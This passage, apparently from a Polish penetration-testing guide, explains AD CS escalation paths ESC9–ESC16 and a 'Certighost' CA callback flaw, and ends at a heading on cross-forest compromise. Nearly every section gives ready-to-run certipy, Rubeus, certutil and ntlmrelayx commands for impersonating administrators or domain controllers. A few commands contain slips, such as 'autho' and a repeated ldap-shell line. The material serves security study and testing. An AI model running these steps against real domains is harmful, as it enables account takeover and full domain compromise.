Nowa wartość **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) dla **`msPKI-Enrollment-Flag`**, określana jako ESC9, zapobiega osadzaniu **nowego rozszerzenia zabezpieczeń `szOID_NTDS_CA_SECURITY_EXT`** w certyfikacie. Ta flaga staje się istotna, gdy `StrongCertificateBindingEnforcement` jest ustawione na `1` (ustawienie domyślne), w przeciwieństwie do wartości `2`. Jej znaczenie wzrasta w scenariuszach, w których można wykorzystać słabsze mapowanie certyfikatu dla Kerberos lub Schannel (jak w ESC10), ponieważ brak ESC9 nie zmieniłby wymagań.<sup>[[7]](#references)</sup>

Warunki, w których ustawienie tej flagi staje się istotne, obejmują:

- `StrongCertificateBindingEnforcement` nie jest ustawione na `2` (wartość domyślna to `1`) lub `CertificateMappingMethods` zawiera flagę `UPN`.
- Certyfikat ma ustawioną flagę `CT_FLAG_NO_SECURITY_EXTENSION` w ustawieniu `msPKI-Enrollment-Flag`.
- Certyfikat zawiera dowolny client authentication EKU.
- Dostępne są uprawnienia `GenericWrite` do dowolnego konta, aby przejąć inne konto.

### Scenariusz nadużycia

Załóżmy, że `John@corp.local` ma uprawnienia `GenericWrite` do `Jane@corp.local`, a celem jest przejęcie `Administrator@corp.local`. Szablon certyfikatu `ESC9`, do którego `Jane@corp.local` ma uprawnienia rejestracji, jest skonfigurowany z flagą `CT_FLAG_NO_SECURITY_EXTENSION` w ustawieniu `msPKI-Enrollment-Flag`.

Początkowo hash `Jane` zostaje uzyskany za pomocą Shadow Credentials dzięki uprawnieniom `GenericWrite` użytkownika `John`:
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
Następnie atrybut `userPrincipalName` użytkownika `Jane` zostaje zmodyfikowany na `Administrator`, celowo z pominięciem części domeny `@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Ta modyfikacja nie narusza ograniczeń, ponieważ `Administrator@corp.local` pozostaje odrębną wartością `userPrincipalName` użytkownika `Administrator`.

Następnie podatny szablon certyfikatu `ESC9` zostaje zamówiony jako `Jane`:
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
Zauważono, że certyfikatowy `userPrincipalName` odzwierciedla `Administrator`, bez żadnego „object SID”.

Następnie `userPrincipalName` użytkowniczki `Jane` zostaje przywrócony do pierwotnej wartości `Jane@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Próba uwierzytelnienia za pomocą wystawionego certyfikatu zwraca teraz hash NT użytkownika `Administrator@corp.local`. Polecenie musi zawierać `-domain <domain>` z powodu braku określenia domeny w certyfikacie:
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
## Słabe mapowania certyfikatów - ESC10

### Wyjaśnienie

Dwie wartości kluczy rejestru na kontrolerze domeny są określane przez ESC10:

- Wartość domyślna `CertificateMappingMethods` w `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` to `0x18` (`0x8 | 0x10`), wcześniej ustawiona na `0x1F`.
- Domyślne ustawienie `StrongCertificateBindingEnforcement` w `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` to `1`, wcześniej `0`.<sup>[[7]](#references)</sup>

**Przypadek 1**

Gdy `StrongCertificateBindingEnforcement` jest skonfigurowane jako `0`.

**Przypadek 2**

Jeśli `CertificateMappingMethods` zawiera bit `UPN` (`0x4`).

### Przypadek nadużycia 1

Gdy `StrongCertificateBindingEnforcement` jest skonfigurowane jako `0`, konto A z uprawnieniami `GenericWrite` może zostać wykorzystane do przejęcia dowolnego konta B.

Na przykład, mając uprawnienia `GenericWrite` do `Jane@corp.local`, attacker chce przejąć `Administrator@corp.local`. Procedura jest analogiczna do ESC9, dzięki czemu można użyć dowolnego certificate template.

Najpierw hash `Jane` jest pobierany za pomocą Shadow Credentials, wykorzystując `GenericWrite`.
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
Następnie `userPrincipalName` użytkownika `Jane` zostaje zmieniony na `Administrator`, celowo z pominięciem części `@corp.local`, aby uniknąć naruszenia ograniczenia.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Następnie żądany jest certyfikat umożliwiający uwierzytelnianie klienta jako `Jane`, przy użyciu domyślnego szablonu `User`.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`userPrincipalName` użytkownika `Jane` zostaje następnie przywrócony do pierwotnej wartości `Jane@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Uwierzytelnienie za pomocą uzyskanego certyfikatu zwróci hash NT użytkownika `Administrator@corp.local`, co wymaga określenia domeny w poleceniu, ponieważ certyfikat nie zawiera informacji o domenie.
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### Przypadek nadużycia 2

Gdy `CertificateMappingMethods` zawiera flagę bitową `UPN` (`0x4`), konto A z uprawnieniami `GenericWrite` może przejąć dowolne konto B, któremu brakuje właściwości `userPrincipalName`, w tym konta komputerów oraz wbudowane konto administratora domeny `Administrator`.

Celem jest tutaj przejęcie `DC$@corp.local`, zaczynając od uzyskania hasha konta `Jane` za pomocą Shadow Credentials i wykorzystując `GenericWrite`.
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
Następnie `userPrincipalName` użytkownika `Jane` zostaje ustawiony na `DC$@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
Certyfikat do uwierzytelniania klienta jest żądany jako `Jane` przy użyciu domyślnego szablonu `User`.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`userPrincipalName` użytkownika `Jane` zostaje przywrócony do pierwotnej wartości po zakończeniu tego procesu.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
Do uwierzytelniania za pomocą Schannel używana jest opcja `-ldap-shell` narzędzia Certipy, co wskazuje na pomyślne uwierzytelnienie jako `u:CORP\DC$`.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Za pośrednictwem powłoki LDAP polecenia takie jak `set_rbcd` umożliwiają ataki Resource-Based Constrained Delegation (RBCD), potencjalnie prowadząc do przejęcia kontrolera domeny.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Ta luka obejmuje również każde konto użytkownika, któremu brakuje `userPrincipalName` lub którego `userPrincipalName` nie odpowiada `sAMAccountName`. Domyślne konto `Administrator@corp.local` jest głównym celem ze względu na podwyższone uprawnienia LDAP oraz domyślny brak `userPrincipalName`.

## Relaying NTLM to ICPR - ESC11

### Wyjaśnienie

Jeśli CA Server nie jest skonfigurowany z `IF_ENFORCEENCRYPTICERTREQUEST`, możliwe jest przeprowadzanie ataków NTLM relay bez podpisywania za pośrednictwem usługi RPC. [Reference in here](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).<sup>[[10]](#references)</sup>

Możesz użyć `certipy`, aby sprawdzić, czy opcja `Enforce Encryption for Requests` jest wyłączona. `certipy` wyświetli wtedy podatność `ESC11`.
```bash
$ certipy find -u <user>@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
0
CA Name                             : DC01-CA
DNS Name                            : DC01.domain.local
Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
....
Enforce Encryption for Requests     : Disabled
....
[!] Vulnerabilities
ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```
### Scenariusz nadużycia

Należy skonfigurować serwer relay:
```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
Uwaga: W przypadku kontrolerów domeny musimy określić `-template` w DomainController.

Lub używając [forka impacket autorstwa sploutchy](https://github.com/sploutchy/impacket):
```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```
## Shell access do ADCS CA z YubiHSM - ESC12

### Wyjaśnienie

Administratorzy mogą skonfigurować Certificate Authority tak, aby przechowywał klucz na zewnętrznym urządzeniu, takim jak „Yubico YubiHSM2”.

Jeśli urządzenie USB jest podłączone do serwera CA przez port USB lub przez USB device server w przypadku, gdy serwer CA jest maszyną wirtualną, do generowania kluczy w YubiHSM i korzystania z nich przez Key Storage Provider wymagany jest klucz uwierzytelniający (czasami określany jako „password”).

Ten klucz/hasło jest przechowywane w rejestrze w lokalizacji `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` w postaci jawnego tekstu.

Reference in [here](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).<sup>[[11]](#references)</sup>

### Scenariusz nadużycia

Jeśli klucz prywatny CA jest przechowywany na fizycznym urządzeniu USB i uzyskano shell access, możliwe jest odzyskanie klucza.

Najpierw należy uzyskać certyfikat CA (jest publiczny), a następnie:
```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```
Wreszcie użyj polecenia `certutil -sign`, aby sfałszować nowy, dowolny certyfikat przy użyciu certyfikatu CA i jego klucza prywatnego.

## OID Group Link Abuse - ESC13

### Wyjaśnienie

Atrybut `msPKI-Certificate-Policy` umożliwia dodanie policy issuance do szablonu certyfikatu. Obiekty `msPKI-Enterprise-Oid` odpowiedzialne za wydawanie policy można znaleźć w Configuration Naming Context (CN=OID,CN=Public Key Services,CN=Services) kontenera PKI OID. Policy można powiązać z grupą AD za pomocą atrybutu `msDS-OIDToGroupLink` tego obiektu, umożliwiając systemowi autoryzowanie użytkownika przedstawiającego certyfikat tak, jakby był członkiem tej grupy. [Odnośnik tutaj](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).<sup>[[12]](#references)</sup>

Innymi słowy, gdy użytkownik ma uprawnienia do zapisania się na certyfikat, a certyfikat jest powiązany z grupą OID, użytkownik może odziedziczyć uprawnienia tej grupy.

Użyj [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1), aby znaleźć OIDToGroupLink:
```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```
### Scenariusz nadużycia

Znajdź uprawnienie użytkownika za pomocą `certipy find` lub `Certify.exe find /showAllPermissions`.

Jeśli `John` ma uprawnienia do rejestrowania się w `VulnerableTemplate`, użytkownik może odziedziczyć uprawnienia grupy `VulnerableGroup`.

Wystarczy określić szablon, a otrzyma certyfikat z uprawnieniami OIDToGroupLink.
```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```
## Podatna konfiguracja odnawiania certyfikatów - ESC14

### Wyjaśnienie

Opis na stronie https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping jest niezwykle szczegółowy. Poniżej znajduje się cytat z oryginalnego tekstu.<sup>[[14]](#references)</sup>

ESC14 dotyczy podatności wynikających ze „słabego jawnego mapowania certyfikatów”, przede wszystkim wskutek niewłaściwego użycia lub niebezpiecznej konfiguracji atrybutu `altSecurityIdentities` na kontach użytkowników lub komputerów w Active Directory. Ten wielowartościowy atrybut umożliwia administratorom ręczne powiązanie certyfikatów X.509 z kontem AD na potrzeby uwierzytelniania. Po wypełnieniu te jawne mapowania mogą nadpisać domyślną logikę mapowania certyfikatów, która zwykle opiera się na nazwach UPN lub DNS w SAN certyfikatu albo na identyfikatorze SID osadzonym w rozszerzeniu bezpieczeństwa `szOID_NTDS_CA_SECURITY_EXT`.

„Słabe” mapowanie występuje, gdy wartość tekstowa używana w atrybucie `altSecurityIdentities` do identyfikacji certyfikatu jest zbyt szeroka, łatwa do odgadnięcia, opiera się na nieunikatowych polach certyfikatu lub wykorzystuje elementy certyfikatu, które można łatwo sfałszować. Jeśli attacker zdobędzie lub utworzy certyfikat, którego atrybuty odpowiadają tak słabo zdefiniowanemu jawnemu mapowaniu uprzywilejowanego konta, może użyć tego certyfikatu do uwierzytelnienia się jako to konto i podszycia się pod nie.

Przykłady potencjalnie słabych ciągów mapowania `altSecurityIdentities` obejmują:

- Mapowanie wyłącznie na podstawie wspólnej nazwy (CN) podmiotu: np. `X509:<S>CN=SomeUser`. Attacker może być w stanie uzyskać certyfikat z takim CN z mniej bezpiecznego źródła.
- Użycie zbyt ogólnych nazw wyróżniających (DN) wystawcy lub podmiotu bez dodatkowego doprecyzowania, takiego jak konkretny numer seryjny lub identyfikator klucza podmiotu: np. `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`.
- Wykorzystanie innych przewidywalnych wzorców lub niekryptograficznych identyfikatorów, które attacker może być w stanie umieścić w certyfikacie uzyskanym legalnie lub sfałszowanym (jeśli przejął CA albo znalazł podatny template, taki jak w ESC1).

Atrybut `altSecurityIdentities` obsługuje różne formaty mapowania, takie jak:

- `X509:<I>IssuerDN<S>SubjectDN` (mapowanie na podstawie pełnych DN wystawcy i podmiotu)
- `X509:<SKI>SubjectKeyIdentifier` (mapowanie na podstawie wartości rozszerzenia Subject Key Identifier certyfikatu)
- `X509:<SR>SerialNumberBackedByIssuerDN` (mapowanie na podstawie numeru seryjnego, niejawnie kwalifikowanego przez DN wystawcy) - nie jest to standardowy format, zwykle używa się formatu `<I>IssuerDN<SR>SerialNumber`.
- `X509:<RFC822>EmailAddress` (mapowanie na podstawie nazwy RFC822, zazwyczaj adresu e-mail, z SAN)
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey` (mapowanie na podstawie skrótu SHA1 surowego klucza publicznego certyfikatu - ogólnie silne)

Bezpieczeństwo tych mapowań w dużym stopniu zależy od szczegółowości, unikatowości i siły kryptograficznej wybranych identyfikatorów certyfikatu użytych w ciągu mapowania. Nawet przy włączonych na Domain Controllers silnych trybach wiązania certyfikatów (które dotyczą przede wszystkim niejawnych mapowań opartych na UPN/DNS w SAN oraz rozszerzeniu SID), nieprawidłowo skonfigurowany wpis `altSecurityIdentities` nadal może stanowić bezpośrednią ścieżkę do podszycia się, jeśli sama logika mapowania jest błędna lub zbyt liberalna.
### Scenariusz nadużycia

ESC14 celuje w **jawne mapowania certyfikatów** w Active Directory (AD), a konkretnie w atrybut `altSecurityIdentities`. Jeśli ten atrybut jest ustawiony (celowo lub wskutek błędnej konfiguracji), attacker może podszywać się pod konta, przedstawiając certyfikaty odpowiadające mapowaniu.

#### Scenariusz A: Attacker może zapisywać do `altSecurityIdentities`

**Warunek wstępny**: Attacker ma uprawnienia zapisu do atrybutu `altSecurityIdentities` docelowego konta lub uprawnienie do ich nadania w postaci jednego z poniższych uprawnień do docelowego obiektu AD:
- Write property `altSecurityIdentities`
- Write property `Public-Information`
- Write property (all)
- `WriteDACL`
- `WriteOwner`*
- `GenericWrite`
- `GenericAll`
- Owner*.
#### Scenariusz B: Cel ma słabe mapowanie X509RFC822 (Email)

- **Warunek wstępny**: Cel ma słabe mapowanie X509RFC822 w `altSecurityIdentities`. Attacker może ustawić atrybut mail ofiary tak, aby odpowiadał nazwie X509RFC822 celu, zapisać się na certyfikat jako ofiara i użyć go do uwierzytelnienia się jako cel.
#### Scenariusz C: Cel ma mapowanie X509IssuerSubject

- **Warunek wstępny**: Cel ma słabe jawne mapowanie X509IssuerSubject w `altSecurityIdentities`.Attacker może ustawić atrybut `cn` lub `dNSHostName` na principalu ofiary tak, aby odpowiadał podmiotowi mapowania X509IssuerSubject celu. Następnie attacker może zapisać się na certyfikat jako ofiara i użyć tego certyfikatu do uwierzytelnienia się jako cel.
#### Scenariusz D: Cel ma mapowanie X509SubjectOnly

- **Warunek wstępny**: Cel ma słabe jawne mapowanie X509SubjectOnly w `altSecurityIdentities`. Attacker może ustawić atrybut `cn` lub `dNSHostName` na principalu ofiary tak, aby odpowiadał podmiotowi mapowania X509SubjectOnly celu. Następnie attacker może zapisać się na certyfikat jako ofiara i użyć tego certyfikatu do uwierzytelnienia się jako cel.
### konkretne operacje
#### Scenariusz A

Poproś o certyfikat z certificate template `Machine`
```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```
Zapisz i przekonwertuj certyfikat
```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```
Uwierzytelnij się (używając certyfikatu)
```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```
Czyszczenie (opcjonalne)
```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```
W przypadku bardziej szczegółowych metod ataku w różnych scenariuszach ataku zapoznaj się z: [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0).<sup>[[13]](#references)</sup>

## Zasady aplikacji EKUwu (CVE-2024-49019) - ESC15

### Wyjaśnienie

Opis dostępny pod adresem https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc jest wyjątkowo szczegółowy. Poniżej znajduje się cytat z oryginalnego tekstu.<sup>[[15]](#references)</sup>

Korzystając z wbudowanych domyślnych szablonów certyfikatów w wersji 1, attacker może utworzyć CSR zawierający zasady aplikacji, które mają pierwszeństwo przed skonfigurowanymi atrybutami Extended Key Usage określonymi w szablonie. Jedynym wymaganiem są uprawnienia enrollment, a technika ta może służyć do generowania certyfikatów client authentication, certificate request agent i codesigning przy użyciu szablonu **_WebServer_**

### Abuse

Dokumentacja privilege-escalation Certipy ([Certipy privilege-escalation documentation](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu)) zawiera bardziej szczegółowe przykłady użycia.<sup>[[14]](#references)</sup>


Polecenie `find` narzędzia Certipy może pomóc zidentyfikować szablony V1, które potencjalnie są podatne na ESC15, jeśli CA nie zostało zaktualizowane.
```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```
#### Scenariusz A: Bezpośrednie podszywanie się przez Schannel

**Krok 1: Zażądaj certyfikatu, wstrzykując „Client Authentication” Application Policy oraz docelowy UPN.** Napastnik `attacker@corp.local` atakuje `administrator@corp.local` przy użyciu szablonu „WebServer” V1 (który zezwala na podanie subject przez enrollee).
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
-application-policies 'Client Authentication'
```
- `-template 'WebServer'`: Podatny template V1 z opcją „Enrollee supplies subject”.
- `-application-policies 'Client Authentication'`: Wstrzykuje OID `1.3.6.1.5.5.7.3.2` do rozszerzenia Application Policies żądania CSR.
- `-upn 'administrator@corp.local'`: Ustawia UPN w SAN w celu impersonation.

**Step 2: Uwierzytelnij się przez Schannel (LDAPS), używając uzyskanego certyfikatu.**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```
#### Scenariusz B: PKINIT/Kerberos Impersonation via Enrollment Agent Abuse

**Krok 1: Zażądaj certyfikatu z szablonu V1 (z opcją "Enrollee supplies subject"), wstrzykując Application Policy "Certificate Request Agent".** Ten certyfikat jest przeznaczony dla atakującego (`attacker@corp.local`), aby mógł stać się agentem rejestracji. W tym miejscu nie określono UPN dla własnej tożsamości atakującego, ponieważ celem jest uzyskanie możliwości działania jako agent.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-application-policies 'Certificate Request Agent'
```
- `-application-policies 'Certificate Request Agent'`: Wstrzykuje OID `1.3.6.1.4.1.311.20.2.1`.

**Krok 2: Użyj certyfikatu „agent”, aby zażądać certyfikatu w imieniu docelowego uprzywilejowanego użytkownika.** Jest to krok podobny do ESC3, w którym certyfikat z Kroku 1 jest używany jako certyfikat agenta.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'User' \
-pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```
**Krok 3: Uwierzytelnij się jako uprzywilejowany użytkownik za pomocą certyfikatu „on-behalf-of”.**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```
## Wyłączone rozszerzenie zabezpieczeń na CA (globalnie)-ESC16

### Wyjaśnienie

**ESC16 (Elevation of Privilege via Missing szOID_NTDS_CA_SECURITY_EXT Extension)** odnosi się do sytuacji, w której konfiguracja AD CS nie wymusza dołączania rozszerzenia **szOID_NTDS_CA_SECURITY_EXT** do wszystkich certyfikatów, co atakujący może wykorzystać poprzez:

1. Zażądanie certyfikatu **bez powiązania z SID**.

2. Użycie tego certyfikatu **do uwierzytelnienia jako dowolne konto**, na przykład podszywając się pod konto z wysokimi uprawnieniami (np. Domain Administrator).

Więcej informacji na temat szczegółowych zasad można znaleźć w tym artykule:https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6<sup>[[16]](#references)</sup>

### Wykorzystanie

Poniższe informacje pochodzą z [tego linku](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally), kliknij, aby zobaczyć bardziej szczegółowe metody użycia.<sup>[[14]](#references)</sup>

Aby sprawdzić, czy środowisko Active Directory Certificate Services (AD CS) jest podatne na **ESC16**
```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```
**Krok 1: Odczytaj początkowy UPN konta ofiary (opcjonalnie — w celu przywrócenia).**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -user 'victim' \
read
```
**Krok 2: Zaktualizuj UPN konta ofiary, ustawiając go na `sAMAccountName` docelowego administratora.**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'administrator' \
-user 'victim' update
```
**Krok 3: (Jeśli to konieczne) Uzyskaj dane uwierzytelniające dla konta „ofiary” (np. za pomocą Shadow Credentials).**
```shell
certipy shadow \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -account 'victim' \
auto
```
**Krok 4: Zażądaj certyfikatu jako użytkownik „ofiara” z _dowolnego odpowiedniego template uwierzytelniania klienta_ (np. „User”) w CA podatnym na ESC16.** Ponieważ CA jest podatny na ESC16, automatycznie pominie rozszerzenie zabezpieczeń SID w wystawionym certyfikacie, niezależnie od konkretnych ustawień tego rozszerzenia w template. Ustaw zmienną środowiskową pamięci podręcznej poświadczeń Kerberos (polecenie powłoki):
```bash
export KRB5CCNAME=victim.ccache
```
Następnie zażądaj certyfikatu:
```bash
certipy req \
-k -dc-ip '10.0.0.100' \
-target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
-template 'User'
```
**Krok 5: Przywróć UPN konta „victim”.**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'victim@corp.local' \
-user 'victim' update
```
**Krok 6: Uwierzytelnij się jako administrator docelowy.**
```bash
certipy auth \
-dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
-username 'administrator' -domain 'corp.local'
```
## Rogue LDAP/LSA chase callback identity substitution (Certighost / CVE-2026-54121)

### Wyjaśnienie

**Certighost** wykorzystuje **AD CS enrollment chase / callback path**, w której CA ufa atrybutom żądania dostarczonym przez requestera podczas ustalania tożsamości, która ma zostać umieszczona w wystawionym certyfikacie. W publicznym PoC spreparowane żądanie zawiera:<sup>[[1]](#references)[[2]](#references)</sup>

- **`cdc`**: kontrolowany przez atakującego host/adres IP, z którym CA nawiąże połączenie
- **`rmd`**: **nazwa DNS docelowego kontrolera domeny** do impersonacji

Jeśli CA podąży tą ścieżką chase, połączy się z atakującym przez **SMB/LSA (`445`)** oraz **LDAP (`389`)**. Atakujący używa **rzeczywistego konta komputera** (zwykle utworzonego dzięki domyślnej wartości **`ms-DS-MachineAccountQuota`**), aby sesja callback została uwierzytelniona jako prawidłowy principal domeny, ale rogue services zwracają zamiast tego atrybuty tożsamości **docelowego kontrolera domeny**:

- `sAMAccountName`
- `objectSid` / SID
- `dNSHostName`

Jeśli CA **nie powiąże kryptograficznie zwróconej tożsamości z uwierzytelnionym principalem callback**, może wystawić certyfikat dla **kontrolera domeny**, mimo że sesja została uwierzytelniona jako konto komputera kontrolowane przez atakującego. To sprawia, że błąd różni się koncepcyjnie od **Certifried**: zamiast przepisywać atrybuty AD, takie jak `dNSHostName`, atakujący **podmienia dane tożsamości podczas rozwiązywania callback CA**.<sup>[[2]](#references)</sup>

**Przydatne warunki wstępne:**

- Niskie uprawnienia i **domain credentials**
- Możliwość **utworzenia lub ponownego użycia konta komputera**
- Osiągalność sieciowa z **CA** do kontrolowanych przez atakującego **portów `389` i `445`**
- Podatna / niezałatana ścieżka żądania CA (aktualizacja Microsoft z **14 lipca 2026 r.** dodała **walidację DC dla `cdc`** oraz **porównanie resolved-SID**)

Uzyskany **`.pfx`** może następnie zostać użyty do **PKINIT**, co prowadzi do uzyskania **`.ccache`**, a w opublikowanym przebiegu PoC także **hasha NT docelowego kontrolera domeny**, co zwykle wystarcza do **pełnego przejęcia domeny**.

### Abuse

Publiczny PoC automatyzuje cały łańcuch:<sup>[[1]](#references)</sup>

1. Utworzenie lub ponowne użycie kontrolowanego przez atakującego **konta komputera**.
2. Uruchomienie **rogue LDAP i SMB/LSA listeners** na portach `389` i `445`.
3. Przesłanie żądania certyfikatu zawierającego kontrolowane przez atakującego atrybuty **`cdc`** oraz docelowy **`rmd`**.
4. Umożliwienie CA uwierzytelnienia się do rogue listeners jako kontrolowane konto komputera, a następnie udzielenie odpowiedzi na zapytania o tożsamość atrybutami **docelowego kontrolera domeny**.
5. Otrzymanie podpisanego przez CA **certyfikatu DC**, a następnie użycie go do **PKINIT**.
```bash
sudo python3 certighost.py -d playground.local -u lowpriv -p 'Password1234' --dc-ip 192.168.1.10
```
Przydatne flagi runtime z PoC:

- `--listener <ip>`: jawny wybór adresu IP callbacku reklamowanego w `cdc`
- `--computer-name <NAME$>`: ponowne użycie istniejącego konta maszyny zamiast tworzenia nowego

**Uwagi operacyjne:**

- PoC wymaga uprawnień **root**, ponieważ wiąże się z **uprzywilejowanymi portami** `389` i `445`.
- Pomyślne wykorzystanie podatności zapisuje lokalnie **DC `.pfx`** i **Kerberos `.ccache`**.
- Ponieważ certyfikat jest mapowany na **konto Domain Controller**, dalsze działania mogą obejmować **certificate-based Kerberos auth**, **DCSync** oraz ponowne użycie odzyskanego **machine NT hash**.<sup>[[2]](#references)</sup>

## Wyjaśnienie kompromitowania lasów za pomocą certyfikatów w stronie biernej

### Łamanie zaufania między lasami przez skompromitowane CA

